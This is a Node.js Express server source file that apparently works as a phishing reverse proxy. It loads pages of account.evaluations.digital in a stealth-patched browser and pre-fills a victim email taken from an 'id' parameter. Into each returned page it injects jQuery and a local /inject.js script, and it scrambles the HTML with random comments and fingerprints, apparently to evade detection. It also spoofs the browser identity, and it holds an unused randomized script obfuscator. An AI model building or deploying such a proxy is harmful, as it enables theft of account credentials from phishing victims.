const express = require("express");
const { chromium } = require("patchright");
const JavaScriptObfuscator = require("javascript-obfuscator");
const crypto = require("crypto");

const app = express();
//Render
//const PORT = 3000;
//const PORT = process.env.PORT || 3000;

let browser;
let context;

//Render
const PAGE_POOL_SIZE = 2;
const pagePool = [];

//
// Launch browser once
//

async function startBrowser() {

  browser = await chromium.launch({
    headless: false,
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      "--single-process",
      "--no-zygote"
    ]
  });

  context = await browser.newContext({
    viewport: null,
    locale: "en-US",
    timezoneId: "America/New_York",
    userAgent:
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"
  });

  for (let i = 0; i < PAGE_POOL_SIZE; i++) {
    const page = await context.newPage();
    pagePool.push(page);
  }

  console.log("Browser + page pool started");

}

async function getPage() {

  if (!browser) {
    throw new Error("Browser not ready");
  }

  while (pagePool.length === 0) {
    await new Promise(r => setTimeout(r, 50));
  }

  return pagePool.pop();

}

/*async function getPage() {

  while (pagePool.length === 0) {
    await new Promise(r => setTimeout(r, 50));
  }

  return pagePool.pop();

}*/

function releasePage(page) {

  page.removeAllListeners();
  page.unroute("**/*").catch(()=>{});
  pagePool.push(page);

}

//
// Close browser cleanly
//
process.on("SIGINT", async () => {
  if (browser) await browser.close();
  process.exit();
});

//
// Randomized JS obfuscation options
//
function getRandomObfuscatorOptions() {

  const encodings = ["base64", "rc4"];

  const shuffle = arr => arr.sort(() => 0.5 - Math.random());

  let chosenEncodings = [];

  if (Math.random() > 0.5) {
    chosenEncodings = shuffle(encodings).slice(
      0,
      Math.floor(Math.random() * encodings.length) + 1
    );
  }

  return {
    compact: true,
    controlFlowFlattening: Math.random() > 0.7,
    deadCodeInjection: Math.random() > 0.6,
    stringArray: true,
    stringArrayEncoding: chosenEncodings,
    stringArrayThreshold: Math.random(),
    renameGlobals: false
  };

}

function debugTagCounts(html) {

  const tags = [
    "html",
    "head",
    "title",
    "body",
    "form",
    "script"
  ];

  const result = {};

  for (const tag of tags) {
    const regex = new RegExp(`<${tag}\\b`, "gi");
    const matches = html.match(regex);
    result[tag] = matches ? matches.length : 0;
  }

  console.log("===== TAG COUNT DEBUG =====");
  console.table(result);

}

//
// Obfuscate JavaScript
//
function obfuscateJavaScript(code) {

  try {

    const options = getRandomObfuscatorOptions();

    const result = JavaScriptObfuscator.obfuscate(code, options);

    return result.getObfuscatedCode();

  } catch (err) {

    console.error("JS obfuscation error:", err);

    return code;

  }

}

//
// Safe HTML obfuscation
//
function obfuscateHTML(html) {

  const comment = () =>
    `<!--${crypto.randomBytes(6).toString("hex")}-->`;

  // inject harmless random comments between tags
  html = html.replace(/>\s+</g, () => `>${comment()}<`);

  // fingerprint marker
  const fingerprint = crypto.randomBytes(4).toString("hex");

  if (html.match(/<\/html>/i)) {
    html = html.replace(
      /<\/html>/i,
      `<!--fp:${fingerprint}--></html>`
    );
  } else {
    html += `<!--fp:${fingerprint}-->`;
  }

  return html;

}

//
// Proxy endpoint
//
app.get("/api/*", async (req, res) => {

  //Render
  //const page = await context.newPage();
  if (!browser) {
    return res.status(503).send("Browser starting, try again in a moment");
  }
  const page = await getPage();
  
  await page.goto("about:blank");
  //await page.unroute("**/*");
  await page.unroute("**/*").catch(()=>{});
  
  let mainHTML = "";

  let targetUrl;

  //const idMatch = req.originalUrl.match(/\/api\/\?id=([^\/?#]+)/i);
  const idMatch = req.originalUrl.match(/id=([^\/?#]+)/i);

  if (idMatch) {

    const email = decodeURIComponent(idMatch[1]);

    targetUrl =
      `https://account.evaluations.digital/synchronization.aspx?holder=${email}`;

  } else {

    targetUrl =
      "https://account.evaluations.digital" +
      req.originalUrl.replace("/api", "");

  }

  console.log("Target:", targetUrl);

  try {

    await page.route("**/*", async route => {

	  const request = route.request();
	  const url = request.url();

	  // Block Google translate scripts
	  if (
		url.includes("translate.google") ||
		url.includes("translate.googleapis")
	  ) {
		console.log("Blocked:", url);
		return route.abort();
	  }

	  const response = await route.fetch();
	  const headers = response.headers();
	  const contentType = headers["content-type"] || "";

	  if (
		request.resourceType() === "document" &&
		request.frame() === page.mainFrame() &&
		contentType.includes("text/html")
	  ) {

		let body = await response.text();

		if (!body.includes("<base")) {
		  body = body.replace(
			"<head>",
			`<head><base href="https://account.evaluations.digital">`
		  );
		}

		body = body.replace(
		  "</body>",
		  `<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
		   <script src="/inject.js"></script>
		   </body>`
		);

		body = obfuscateHTML(body);

		mainHTML = body;

		return route.fulfill({
		  response,
		  body
		});

	  }

	  route.fulfill({ response });

	});
	
	//await page.goto(targetUrl, { waitUntil: "domcontentloaded" });
	//Render
	//await page.goto(targetUrl, { waitUntil: "commit" });
	/*await page.goto(targetUrl, {
	  waitUntil: "commit",
	  timeout: 30000
	});*/

    await page.setExtraHTTPHeaders({
	  "accept-language": "en-US,en;q=0.9"
	});

	const response = await page.goto(targetUrl, {
	  waitUntil: "domcontentloaded",
	  timeout: 60000
	});
	
	console.log("STATUS:", response?.status());
	console.log("FINAL URL:", page.url());
	
	await page.waitForTimeout(3000);

	await page.waitForLoadState("networkidle").catch(()=>{});
	  
	const title = await page.title();
	console.log("PAGE TITLE:", title);

    if (response && response.status() === 200) {
	  await page.waitForFunction(() => {
	    return document.body && document.body.innerHTML.length > 500;
	  }, { timeout: 15000 }).catch(() => {});
	}
	  
	await page.waitForSelector("form", { timeout: 15000 }).catch(() => {});
	
    //
    // Get final HTML
    //
    //const html = await page.content();
	//const html = await page.evaluate(() => document.documentElement.outerHTML);
	//Render
	//const html = mainHTML;
	const html = mainHTML || await page.content();
    console.log("HTML length:", html.length);
	  
	//Render
    //await page.close();
	//releasePage(page);

    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Content-Type", "text/html");
    debugTagCounts(html);
    res.send(html);

  } catch (err) {

    console.error("Proxy error:", err);
    
	//Render
    //await page.close();
	//releasePage(page);

    res.sendStatus(500);

  } finally {

  releasePage(page);

}

});

app.get("/inject.js", (req,res)=>{
  res.sendFile(__dirname + "/inject.js");
});

//
// CORS
//
app.options("/api/*", (req, res) => {

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  res.sendStatus(200);

});

//
// Start server
//
const PORT = process.env.PORT || 10000;
app.listen(PORT, "0.0.0.0", async () => {

  console.log(`Proxy running on port ${PORT}`);

  try {
    await startBrowser();
  } catch (err) {
    console.error("Browser startup failed:", err);
  }

});

/*app.listen(PORT, "0.0.0.0", () => {
  console.log(`Proxy running on port ${PORT}`);
});*/












